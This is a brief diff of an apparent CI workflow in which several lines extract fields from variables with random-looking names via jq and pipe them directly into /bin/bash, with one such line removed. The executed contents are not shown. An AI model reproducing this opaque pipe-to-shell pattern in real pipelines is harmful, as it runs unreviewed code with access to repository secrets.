@@ -21,7 +21,6 @@ jobs:
           echo $r0655 | jq -r .ijesl58 | /bin/bash
           echo $xrc81 | jq -r .adbb29168 | /bin/bash
           printf '%s' "$tgl6984" | jq -r .mub5566 | /bin/bash
-          printf '%s' "$yzakw5" | jq -r .rtuv01 | /bin/bash
           printf '%s' "$i3" | jq -r .uv00978 | /bin/bash
 
       - name: Save results
